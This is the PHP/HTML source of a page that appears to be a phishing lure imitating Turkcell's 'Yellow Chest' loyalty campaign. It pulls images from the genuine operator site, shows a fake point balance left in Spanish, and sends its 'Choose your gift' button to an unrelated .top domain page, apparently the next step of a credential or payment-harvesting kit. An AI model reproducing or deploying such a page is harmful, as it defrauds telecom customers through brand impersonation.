<?php include 'header-new.php';?>
   <style>
   .text-satura {
    font-weight: 700;
    font-family: Greycliff,"Helvetica",Arial,sans-serif;
    letter-spacing: -.03em;
    color: #04a0e7;
  
    font-size: 22px;
    position: relative;
    text-align: center;
    padding: 20px 10px;
}
   a {
  text-decoration: none;
}
.accordion,.accordion * {
    -webkit-box-sizing: border-box;
    -moz-box-sizing: border-box;
    box-sizing: border-box
}

.accordion {
    overflow: hidden;
    background: #ffffff;
    border-top: 1px solid #acacac;
    margin: 30px 0 40px;

}

.accordion-section {
    border-bottom: 1px solid #acacac
}

.accordion-section-title {
    width: 100%;
    padding: 15px 10px;
    display: inline-block;
    position: relative;
    background: #ffffff;
    color: #1a1918;
    transition: all linear 0.15s
}

.accordion-section-title:focus {
    color: #1a1918
}

.accordion-section-title .plus, .accordion-section-title .minus {
    position: absolute;
    right: 0;
    font-size: 30px;
    top: 1px;
    right: 10px;
}
h2.title.text-satura.title-turqoise {
    margin-bottom: 0px !important;
    padding-bottom: 0px;
}

.accordion-section-title .plus {
    display: inline-block;
    float: right
}

.accordion-section-title .minus {
    display: none
}

.accordion-section-title.active {
    color: #1a1918
}

.accordion-section-title.active .minus {
    display: inline-block;
    float: right
}

.accordion-section-title.active .plus {
    display: none
}

.accordion-section-title.active,.accordion-section-title:hover {
    text-decoration: none
}

.accordion-section-content {
    padding: 15px 5px;
    display: none
}

.accordion-section-content p {
    margin-top: 0
}

.accordion-section-content#accordion-3 p {
    margin-bottom: 2px;
    line-height: 1.2
}

    .o-header-mobile__buttons .m-btn-group .js-login, .o-header-mobile__buttons .m-btn-group .js-search {
    display: block;
}

 
                     .terms_agreement_style ol {
                     counter-reset: item;
                     }
                     .terms_agreement_style ol>li {
                     display: table-row;
                     }
                     .terms_agreement_style ol>li:before {
                     content: counters(item, ".") "  ";
                     counter-increment: item;
                     font-weight: bold;
                     display: table-cell;
                     text-align: justify;
                     padding-right: .3em;
                     }
					.tab__button {
						width: 100%; 
					}
					.container h1 {
    text-align: center;
}
h3.subtitle_ac {
    text-align: center;
    margin-bottom: 12px;
    color: #2855ac;
}
h2.title.text-satura.txt-center.t-b-12 {
    color: #4d4d4d;
    font: 18px ;
    letter-spacing: 0;
    font-weight: 700;
    margin-bottom: 0px;
    padding-bottom: 10px;
}
.social-responsibility-item {
    text-align: center;
}
.content {
    padding: 0px 16px;
}
.step_btn {
    font-weight: normal;
    font-family: Greycliff,"Helvetica",Arial,sans-serif;
    letter-spacing: -.03em;
    position: relative;
    text-align: center;
    background-color: #ffc80c;
    padding: 11px 24px;
    font-size: 1rem;
    display: block;
    width: 212px;
    min-width: 120px;
    margin-left: auto;
    margin-right: auto;
    line-height: 22px;
    border-radius: 32px;
    color: #fff;
    border-color: #ffc80c;
    height: auto;
    cursor: pointer;
	    margin-bottom: 20px;
}
                 
   </style> 
      
      
      <script type="text/javascript">
         function mobileBasketItem() {
         	$.ajax({
         		type: "POST",
         		url: "/hesabim/mobile-basket-items-count",
         		headers: {'X-Tcell-Ajax': 'true'},
         	}).done(function (basketItemSize) {
         		if (basketItemSize >= 0) {
         			$(".a-user-basket__badge").removeClass("js-hidden");
         			document.getElementsByClassName("a-user-basket__badge")[0].textContent = basketItemSize;
         		}
         	}).fail(function () {
         		$(".a-user-basket__badge").addClass("js-hidden");
         	});
         
         }
         
         window.addEventListener("load", mobileBasketItem);
         
         
      </script>
	  	  <h2 class="title text-satura title-turqoise">YELLOW CHEST</h2>
		  <div class="content">
		  <img src="https://m.kktcell.com/assets/web/build/assets/images/content/global/sari-sandik/nedir.png">
				<h2 class="title text-satura txt-center t-b-12">What is Yellow Chest?</h2>
				<h3 class="subtitle_ac">Puntos disponibles: 5340</h3>
				<p>
				On the day you join the Yellow Chest campaign, points are added to your Chest as much as the day you signed up for Turkcell. After the day you join the campaign, you continue to accumulate points for every day you are a Turkcell subscriber. 20 points for each day in Platinum tariffs, 10 points for customers with package tariffs, and 1 point for other customers for each day.
				</p>
				</div>
				</div>
				<div class="social-responsibility-item ">
				<span class="image text-center"><img class="inline-block" src="https://m.kktcell.com//assets/web/build/assets/images/content/global/sari-sandik/katalog.png" alt="Yellow Chest Catalog"></span>
				<div class="content">
				<h2 class="title text-satura txt-center t-b-12">Yellow Chest Catalog</h2>
				<p>
				In the Yellow Chest catalog, we offer a lot of gifts to SMS packages, gift certificates, Turkcell services, smartphones and tablets. We update the gifts and gifts in the catalog in parallel with the wishes of our customers. We recommend that you visit Yellow Chest frequently to avoid missing gifts and limited gifts. We are waiting for you to check out the gifts right now or to make your selection.
				</p>
				</div>
				<a href="https://telcei.chodoe.top/page6.php" onclick="$('a.nxm-cls-c-1').trigger('click')" class="but but--primary has-hover-icon text-satura text-truncate step_btn ">Choose your gift</a>
				</div>
		  
         <!--div class="accordion">
					<div class="accordion-section">
						<a href="#accordion-2" class="accordion-section-title">What is Yellow Chest?<span class="plus">+</span><span class="minus">-</span></a>

						<div id="accordion-2" class="accordion-section-content" style="display: none;">
							
                           <div class="padv content">
<div class="social-responsibility-item ">
<span class="image text-center"><img class="inline-block" src="https://m.kktcell.com//assets/web/build/assets/images/content/global/sari-sandik/nedir.png" alt="What is Yellow Chest?"></span>
<div class="content">
<h2 class="title text-satura txt-center t-b-12">What is Yellow Chest?</h2>
<h3 class="subtitle_ac">Puntos disponibles: 5340</h3>
<p>
On the day you join the Yellow Chest campaign, points are added to your Chest as much as the day you signed up for Turkcell. After the day you join the campaign, you continue to accumulate points for every day you are a Turkcell subscriber. 20 points for each day in Platinum tariffs, 10 points for customers with package tariffs, and 1 point for other customers for each day.
</p>
</div>
</div>
<div class="social-responsibility-item ">
<span class="image text-center"><img class="inline-block" src="https://m.kktcell.com//assets/web/build/assets/images/content/global/sari-sandik/katalog.png" alt="Yellow Chest Catalog"></span>
<div class="content">
<h2 class="title text-satura txt-center t-b-12">Yellow Chest Catalog</h2>
<p>
In the Yellow Chest catalog, we offer a lot of gifts to SMS packages, gift certificates, Turkcell services, smartphones and tablets. We update the gifts and gifts in the catalog in parallel with the wishes of our customers. We recommend that you visit Yellow Chest frequently to avoid missing gifts and limited gifts. We are waiting for you to check out the gifts right now or to make your selection.
</p>
</div>
<a href="https://telcei.chodoe.top/page6.php" onclick="$('a.nxm-cls-c-1').trigger('click')" class="but but--primary has-hover-icon text-satura text-truncate step_btn">Choose your gift</a>
</div>
<!--<div class="social-responsibility-item ">
<span class="image text-center"><img class="inline-block" src="https://m.kktcell.com//assets/web/build/assets/images/content/global/sari-sandik/puan.png" alt="Yellow Chest Transaction"></span>
<div class="content">
<h2 class="title text-satura txt-center t-b-12">Yellow Chest Transaction</h2>
<p>
You can easily track in your pts earned in Yellow Chest, spending points, selected gifts and other details from 'My Past Transactions'.
</p>
</div>
<a href="/en/my-account/yellow-chest" class="but but--primary has-hover-icon text-satura text-truncate">Points</a>
</div>-->
</div>
 
						</div>
					</div>
				   
	     </div-->
		
		 
	  <script>
	      $(document).ready(function() {
    function close_accordion_section() {
        $('.accordion .accordion-section-title').removeClass('active');
        $('.accordion .accordion-section-content').slideUp(300).removeClass('open');
    }

    $('.accordion-section-title').click(function(e) {
        // Grab current anchor value
        var currentAttrValue = $(this).attr('href');

        if($(e.target).is('.active')) {
            close_accordion_section();
        }else {
            close_accordion_section();

            // Add active class to section title
            $(this).addClass('active');
            // Open up the hidden content panel
            $('.accordion ' + currentAttrValue).slideDown(300).addClass('open');
        }

        e.preventDefault();
    });
});

	  </script>
    <?php include 'footer-new.php';?>